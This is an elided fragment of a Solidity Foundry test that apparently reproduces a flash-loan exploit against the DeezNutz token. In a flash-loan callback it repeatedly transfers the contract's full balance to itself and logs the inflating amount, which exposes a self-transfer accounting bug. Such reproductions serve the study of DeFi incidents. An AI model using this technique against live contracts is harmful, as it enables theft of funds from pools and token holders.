...
contract DeezNutzTest is Test {
    ...
    function setUp() public {
        ...
        emit log_named_uint(
            ...
            WETH.balanceOf(address(this)) / 1 ether
        );
    }
    ...
    function receiveFlashLoan(
        ...
        emit log_named_uint(
            "after swap, DeezNutz amount",
            DeezNutz.balanceOf(address(this)) / 1 ether
        );

        for (uint256 x = 0; x < 5; x++) {
            DeezNutz.transfer(address(this), DeezNutz.balanceOf(address(this)));
            emit log_named_uint(
                "after self transfer, DeezNutz amount",
                DeezNutz.balanceOf(address(this)) / 1 ether
            );
        }
